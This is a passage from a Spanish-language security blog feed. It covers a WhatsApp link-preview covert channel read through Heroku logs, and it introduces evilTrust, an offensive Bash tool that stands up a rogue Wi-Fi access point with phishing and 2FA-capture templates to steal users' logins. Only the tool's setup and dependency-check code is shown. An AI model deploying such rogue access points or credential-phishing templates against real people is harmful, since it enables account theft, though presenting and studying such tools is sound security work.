2020-02-03T11:15:28.375122+00:00 heroku[router]: at=info method=GET path=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; host=s4vitar.herokuapp.com request_id=e9db6b57-a2dc-406f-9d09-2549f65d429a fwd=&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.160&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; dyno=web.1 connect=1ms service=2ms status=200 bytes=233 protocol=http
2020-02-03T11:15:28.714967+00:00 heroku[router]: at=info method=GET path=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;favicon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ico&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; host=s4vitar.herokuapp.com request_id=4bfb04e1-3b32-46a7-b0a0-3208e321596e fwd=&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.160&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; dyno=web.1 connect=1ms service=2ms status=404 bytes=373 protocol=http
2020-02-03T11:15:28.715303+00:00 app[web.1]: 10.111.222.196 - - [03/Feb/2020:11:15:28 +0000] &quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;favicon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ico&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; 404 209 &quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//s4vitar.herokuapp.com/index.html&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya en este punto, podéis comenzar con la conversación encubierta.&lt;/p&gt;

&lt;p&gt;Lo único que tenéis que hacer es lo siguiente: Abrid una conversación en WhatsApp con alguno de vuestros contactos, haced como si fuerais a enviar un mensaje a vuestro compañero escribiendo la dirección URL (en este caso la mía como PoC) &lt;a href=&quot;http://s4vitar.herokuapp.com/&quot;&gt;http://s4vitar.herokuapp.com/&lt;/a&gt; y posteriormente escribid vuestro mensaje pegado a la barra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, por ejemplo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/whatsapp-victor.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Inmediatamente tras introducir los nuevos caracteres después de la barra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, empezaréis a ver desde el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heroku logs&lt;/code&gt; a tiempo real los caracteres que se están escribiendo, sin enviar el mensaje a nuestro contacto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/logs-heroku.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;De hecho si os fijáis, se puede considerar también un posible &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP Disclosure&lt;/code&gt;, dado que podemos ver direcciones IP internas de WhatsApp:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;10.142.192.223&lt;/li&gt;
  &lt;li&gt;10.99.209.116&lt;/li&gt;
  &lt;li&gt;10.47.180.171&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La idea en este punto, sería que nuestro compañero tuviera también descargado nuestro repositorio en local para efectuar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heroku logs&lt;/code&gt; y poder así también visualizar los logs a tiempo de escritura. De esta forma, resulta sencillo montarse un pequeño script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bash&lt;/code&gt; u otro lenguaje que parsee la información más relevante, seguido de ciertas reglas que habría que configurar para por ejemplo configurar los nombres de usuario, espacios y algunas cosas adicionales (no es muy costoso).&lt;/p&gt;

&lt;p&gt;Lo mejor de esto es que nunca estaremos enviando el mensaje a la persona en cuestión, pues todo esto se hace mientras escribimos antes de enviar.&lt;/p&gt;

&lt;h2 id=&quot;por-qué-sucede-esto&quot;&gt;¿Por qué sucede esto?&lt;/h2&gt;

&lt;p&gt;Cuando enviamos un mensaje a una persona en la que hay incluida una dirección URL, se carga una previsualización de la página antes de enviarlo. De esta forma, ya se está tramitando a nivel de petición un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; contra el servidor para obtener así la preview.&lt;/p&gt;

&lt;p&gt;Lo mismo pasaría con el resto de caracteres, por cada caracter que introducimos, es un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; que se aplica hacia el servidor, lo que hace que si estamos a la escucha desde el lado del servidor atendiendo a los logs veamos esas peticiones entrantes.&lt;/p&gt;

&lt;p&gt;Esto por defecto no sólo pasa en WhatsApp, también ocurre en Twitter, Telegram y otras plataformas.&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Research" /><category term="WhatsApp" /><category term="Canales Encubiertos" /><summary type="html">En el siguiente artículo, os muestro una forma de mantener conversaciones encubiertas sin que quede registro en el historial de conversaciones de WhatsApp. De esta forma, dos personas pueden mantener una conversación mediante la lectura de logs a tiempo de escritura sin necesidad de enviar el mensaje.</summary></entry><entry><title type="html">h-c0n 2020 - evilTrust (Herramienta Ofensiva)</title><link href="http://localhost:4000/evil-trust/" rel="alternate" type="text/html" title="h-c0n 2020 - evilTrust (Herramienta Ofensiva)" /><published>2020-02-02T00:00:00+01:00</published><updated>2020-02-02T00:00:00+01:00</updated><id>http://localhost:4000/evil-trust</id><content type="html" xml:base="http://localhost:4000/evil-trust/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/evil.png&quot; width=&quot;200&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Recientemente estuve en la &lt;strong&gt;h-c0n&lt;/strong&gt; presentando la herramienta &lt;a href=&quot;https://github.com/s4vitar/evilTrust&quot;&gt;evilTrust&lt;/a&gt;. Antes que nada quiero agradecer a los organizadores del evento por invitarme y a todos los presentes por la gran acogida, lo pasamos entre todos bastante bien.&lt;/p&gt;

&lt;div class=&quot;row&quot;&gt;
  &lt;div class=&quot;columns&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo5.png&quot; alt=&quot;Snow&quot; style=&quot;width:30%&quot; /&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo4.png&quot; alt=&quot;Forest&quot; style=&quot;width:37%&quot; /&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo2.png&quot; alt=&quot;Mountains&quot; style=&quot;width:30%&quot; /&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo3.png&quot; alt=&quot;Mountains&quot; style=&quot;width:30%&quot; /&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo1.png&quot; alt=&quot;Mountains&quot; style=&quot;width:34%&quot; /&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo6.png&quot; alt=&quot;Mountains&quot; style=&quot;width:34%&quot; /&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
Para los interesados, deciros que tenéis la charla disponible en el siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=-GIA9et7ZRg&quot;&gt;h-c0n 2020 | evilTrust - Herramienta Ofensiva&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;También os la dejo por aquí para aquellos que la quieran ver directamente:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/-GIA9et7ZRg&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;qué-es-eviltrust&quot;&gt;¿Qué es EvilTrust?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;EvilTrust&lt;/strong&gt; es una herramienta ofensiva, ideal para robar los datos de acceso de un usuario. A altos rasgos, la herramienta se encarga de manera automatizada de desplegar un &lt;strong&gt;Rogue AP&lt;/strong&gt;, quedando a la espera de clientes potenciales que se asocien a este para proseguir con el ataque.&lt;/p&gt;

&lt;p&gt;Cabe decir que el objetivo principal no es el de un ataque &lt;strong&gt;Evil Twin&lt;/strong&gt;, puesto que la finalidad no es obtener la contraseña de una red inalámbrica, sino los datos privados del cliente que se asocie al punto de acceso.&lt;/p&gt;

&lt;p&gt;La herramienta dispone de varias plantillas a utilizar, incluyendo una plantilla personalizada, donde el atacante es capaz de desplegar su propia plantilla.&lt;/p&gt;

&lt;h2 id=&quot;qué-capacidades-trae-eviltrust&quot;&gt;¿Qué capacidades trae evilTrust?&lt;/h2&gt;

&lt;p&gt;Cada una de las plantillas configuradas (Facebook, Twitter, Google, Starbucks, Yahoo, …) vienen acompañadas de una plantilla de 2FA (Segundo Factor de Autenticación), la cual nos permitirá obtener el código de acceso que se envía por SMS a todo usuario que disponga de esta medida de protección activada.&lt;/p&gt;

&lt;h2 id=&quot;cómo-está-estructurada-la-herramienta&quot;&gt;¿Cómo está estructurada la herramienta?&lt;/h2&gt;

&lt;p&gt;La herramienta está desarrollada en &lt;strong&gt;Bash&lt;/strong&gt;, y es capaz de operar en 2 modos en base al parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilTrust&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; 

&lt;span class=&quot;err&quot;&gt;╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Hecho&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;por&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;Uso&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Modo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ejecución&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Mostrar&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;este&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;panel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ayuda&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Modo terminal&lt;/strong&gt;: Para los amantes de consola que prefieren no hacer uso de interfaz gráfica&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Modo GUI&lt;/strong&gt;: Para los amantes de interfaz gráfica que odian manejarse por consola&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esta parte se gestiona básicamente desde esta porción de código:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Main&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Program&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$(id -u)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter_enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getopts&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:m:h:&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OPTARG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter_enable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;helpPanel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;esac&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parameter_enable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;helpPanel&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$mode&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;terminal&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;dependencies&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;startAttack&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$mode&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gui&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;guiMode&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Modo no conocido&quot;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tras su ejecución, a través de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dependencies&lt;/code&gt;, se hace una comprobación de las herramientas necesarias para que evilTrust funcione:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;dependencias&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostapd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;programa&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${dependencias[@]}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$(command -v $programa)&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;. . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada&quot;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0.4&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$(echo $counter)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Comenzando...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnorm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

